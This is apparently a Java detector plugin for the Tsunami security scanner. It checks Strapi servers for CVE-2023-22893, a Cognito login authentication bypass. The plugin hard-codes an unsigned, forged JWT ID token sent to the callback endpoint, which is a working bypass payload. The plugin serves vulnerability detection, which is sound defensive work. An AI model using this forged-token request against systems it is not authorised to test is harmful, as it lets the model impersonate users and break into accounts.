/*
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202322893;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.ACCEPT_LANGUAGE;
import static com.google.common.net.HttpHeaders.UPGRADE_INSECURE_REQUESTS;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonObject;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2023-22893. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202322893VulnDetector",
    version = "0.1",
    description =
        "CVE-2023-22893: Strapi through 4.5.5 does not verify the access or ID tokens issued during"
            + " the OAuth flow when the AWS Cognito login provider is used for authentication.",
    author = "Secureness",
    bootstrapModule = Cve202322893DetectorBootstrapModule.class)
public final class Cve202322893VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  /*
   ** This JWT token uses HS256 and defines the cognito username to tsunami-security-scanner and
   ** the email to tsunami-security-scanner@google.com.
   */
  @VisibleForTesting
  static final String VULNERABLE_REQUEST_PATH =
      "api/auth/cognito/callback?access_token=something&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjb2duaXRvOnVzZXJuYW1lIjoidHN1bmFtaS1zZWN1cml0eS1zY2FubmVyIiwiZW1haWwiOiJ0c3VuYW1pLXNlY3VyaXR5LXNjYW5uZXJAZ29vZ2xlLmNvbSJ9.";

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202322893VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  private static String buildTarget(NetworkService networkService) {
    return buildWebApplicationRootUrl(networkService);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-22893 starts detecting.");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    HttpHeaders httpHeaders =
        HttpHeaders.builder()
            .addHeader(UPGRADE_INSECURE_REQUESTS, "1")
            .addHeader(ACCEPT_LANGUAGE, "en-US,en;q=0.5")
            .build();
    String targetUrl = buildTarget(networkService) + VULNERABLE_REQUEST_PATH;
    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetUrl).setHeaders(httpHeaders).build(), networkService);
      // if the target is vulnerable, we expect a JSON response that contains a JWT token.
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }

      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("user") && jsonResponse.keySet().contains("jwt")) {
        return true;
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_22893"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Authentication Bypass For Strapi AWS Cognito Login Provider")
                .setDescription(
                    "Strapi before 4.5.5 does not verify the access or ID tokens issued during the"
                        + " OAuth flow when the AWS Cognito login provider is used for"
                        + " authentication. A remote attacker could forge an ID token that is"
                        + " signed using the 'None' type algorithm to bypass authentication and"
                        + " impersonate any user that use AWS Cognito for authentication. with the"
                        + " help of CVE-2023-22621 and CVE-2023-22894 attackers can gain"
                        + " Unauthenticated Remote Code Execution on this version of Strapi")
                .setRecommendation("Upgrade to version 4.5.6 and higher"))
        .build();
  }
}
